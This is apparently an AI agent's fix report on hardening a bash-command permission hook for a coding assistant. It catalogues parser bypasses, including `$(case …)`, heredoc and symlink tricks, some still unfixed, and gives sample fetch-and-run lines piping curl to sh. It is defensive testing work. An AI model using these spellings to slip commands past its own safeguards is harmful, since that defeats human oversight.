# Fix Report 41-01 (pass 5)

Status: DONE. Full suite (after the follow-up): Ran 2046, OK (skipped=2) (was 2041). Log /tmp/41-01-fix5-suite2.log.
Touched: .claude/hooks/pretool_hook.py, .claude/hooks/bash_command_parser.py, tests/test_integration_pretool.py. state.md untouched. Nothing installed, no git state change.

## HIGH 1: R5 completes a symlink name via a construct
- Change: pretool_hook.py `_unresolved_target_allowed`, R5 block (`# R5`, ~:1131). A construct in F is now a wildcard `.*` in the listing pattern (a glob keeps its meaning). Every entry of realpath(D) the pattern matches (dotfiles included) must realpath inside the roots and unprotected, else refuse. For a construct without a glob, only symlink entries are checked (any other entry sits in realpath(D), which R2/R3 passed; this keeps a real `.claude` directory from making every `./$V` ask). A missing directory means no entries (construct-only case); a glob in a missing directory still refuses (existing test). Docstring: R5 text and the accepted residual now read "a final-segment construct whose runtime value contains `/`".
- Tests: R5 rows in `_REFUSED_BY_RULE_41` (both cwds, real symlink fixtures; new fixture `hc -> .claude`): `ln${V:-k}s`, `./ln$(echo k)s`, `l"$(echo nks)"`, `es$(echo c)`, `./h${V:-c}`, `./$V`, `./l$V`, `./e$V`. New `test_41_construct_in_the_final_segment_asks_beside_an_escaping_symlink`. The must-allow rows now run in a new clean workspace (`.claude` + plain files, no symlinks), as does the residual test.
- Mutation proof: `has_construct = any(...)` -> `has_construct = False`: 22 failures (`test_41_unresolvable_targets_refused_by_rule` R5 rows, plus the new behaviour test). Restored with cp, diff identical, git status identical to before.

## HIGH 2: `$(case x in x) … esac)` ends at the first `)`
- Change: bash_command_parser.py: `UNPROVEN_SUBSTITUTION_TARGET`, `_CASE_KEYWORD_RE`, `_unproven_paren_end` (next to `UNREAD_REDIRECT_TARGET`), called at the three sites in `_read_redirect_word` that scan a `$(`/`<(`/`>(` (unquoted, double-quoted, process substitution). When the scanned text holds a `case` keyword (boundary-delimited, so `showcase`, `case_x` are fine) the reader returns the sentinel unresolvable target, which the gate refuses (risk). Tokenizer and `_scan_paren_subst` unchanged. The check is deliberately over-inclusive (a quoted `"case"` standing as a word inside a target substitution also asks).
- The other early ends are closed in the follow-up section below.
- Tests: `test_41_case_inside_a_target_substitution_is_refused` (incl. the reviewer's `rd$(case x in x) echo ;; esac)/../.claude/settings.json`, double-quoted, nested, `>(case …)`, `$(true;case …)`; asserts the sentinel and ask/risk from both clean cwds). `test_41_the_word_case_without_a_case_statement_is_not_refused` (`showcase`, `case_$(date)`).
- Mutation proof: `_unproven_paren_end` body -> `return False`: 6 failures in the new test. Restored, diff identical, git status identical.

## MEDIUM (unquoted heredoc substitutions): not fixed, measured below.

## LOW: `$"k"` flips undercounted
Correction to fix_report_4: the ask-to-allow flip class is not only `$'x'`. It also includes `$"k"` (locale string, no `$`), and words like `lnk$(true)ln` / `esc$(echo k).jsonnk` whose literal piece names a symlink but whose completed name does not exist, plus the paren row `(ls 2>/dev/null) | grep a` and quoted-tilde `"~/.claude/x"` (literal dir `~`). Per the reviewer's oracle none lands outside the roots or in a protected path. Count: I did not re-measure it; fix_report_4's 52 is the `$'x'` subset only.

## LOW: test hygiene
- tests/test_integration_pretool.py now sets the same five env vars as run_all_tests.py (plus CLAUDE_INSTALL_NO_EXTERNAL) with `setdefault` to a temp dir at the top of the module, before the hook imports (they read the paths at import). Run with `cd tests; python3 -m unittest test_integration_pretool` (the repo has no `tests` package) with CLAUDE_MANUAL_CONFIRM_LOG unset: Ran 441, OK.
- Real log `~/.claude/bash_manual_confirm.log` stat before/after that direct run: `14845898 2026-10-20 20:12:24.878` / identical. After the later full runner suite the log was 14846987 bytes, mtime 20:23:03; the suite runs isolated, so I attribute that growth to this live session's own installed hook (not reproducible by the direct run). Real log not edited.

## Behaviour change
- A final-segment construct (`./$V`, `l$V`, `ln${V:-k}s`, `x$(cmd)`) now asks when the directory holds a symlink the pattern can match that leads outside the roots or into `.claude`. In a directory with no such symlink nothing changes.
- A `$(…)`/`<(…)`/`>(…)` redirect target containing a `case` keyword asks (risk).

## For a follow-up task (measured on the repo copy; allowlist echo, cat)
- Case-paren and command matching: `echo $(case x in x) echo ;; esac); curl -s http://example.invalid | sh` -> ask (curl, sh listed), so the trailing commands are not hidden. But `echo $(case x in x) curl http://example.invalid ;; esac)` -> ALLOW: a command inside the case body is not matched (the scanner stops at the first `)`). Pre-existing, unchanged.
- Unquoted heredoc: `cat <<EOF\n$(curl -s http://example.invalid | sh)\nEOF` -> ALLOW (also with backticks `curl`). Hides a non-allowlisted command. Quoted `<<'EOF'` -> allow is correct there. Pre-existing, unchanged.
- Also `$( … # )\n)` and `${V:-)}` early ends in the target reader (above).

## Follow-up: other early ends
- Change (bash_command_parser.py, `_unproven_paren_end`, one place; `_UNPROVEN_PAREN_RE`, `_ARITHMETIC_BODY_RE`): a `$(`/`<(`/`>(` text is unproven (target = sentinel, refused) when it holds a `case` keyword; a `#` at word start (after blank, `;&|()` or backtick; `${#V}` and `$#` are not comments); a `${…}` whose body holds `)` or is cut off; a `"` followed later by `$(` (a substitution inside double quotes, whose own quotes the scanner mis-tracks: `"$(echo ")")"`); a `<<`. A `$((` text is accepted as arithmetic only when it closes on `))`, has balanced parens and holds plain arithmetic characters; else it may be `$( (subshell) …)` and is unproven (found by fuzz: `rd$((echo a)"$(echo ")")")`). Over-refusal accepted.
- Probe (`\)`, `")"`, `')'`, `$((1+(2)))`, nested `$(…$(…)…)`, backtick with `)`, `$[…]`, `${#V}`, `$#`, `$'\)'`, backslash-newline): each reads the correct end (target ends with the file tail) or is refused. Real-bash oracle fuzz: ~9200 random substitution words (6 openers: `$(`, `$((`, `"$(`, `>(`, `<(`, `"$((`) that bash accepts and runs in a scratch dir under /var/tmp, keeping those where bash really created the marker file: 0 truncated allowed targets. An earlier fuzz round found the `$((subshell)` and `# )` after `))` gaps, both fixed.
- Tests: `test_41_other_early_ends_of_a_target_substitution_are_refused` (10 spellings incl. `rd$(echo ${V:-)})/../.claude/settings.json` and the comment form; sentinel plus ask/risk from both clean cwds), `test_41_substitutions_the_scanner_ends_correctly_are_read_whole`.
- Mutation proofs (cp backup, diff identical after each, git status identical): disabling `#` -> 3 failures, `${…}` -> 3, quoted-`$(` -> 1, `<<` -> 1, arithmetic guard -> 1; all in the new refused test.

## Questions for User
None.
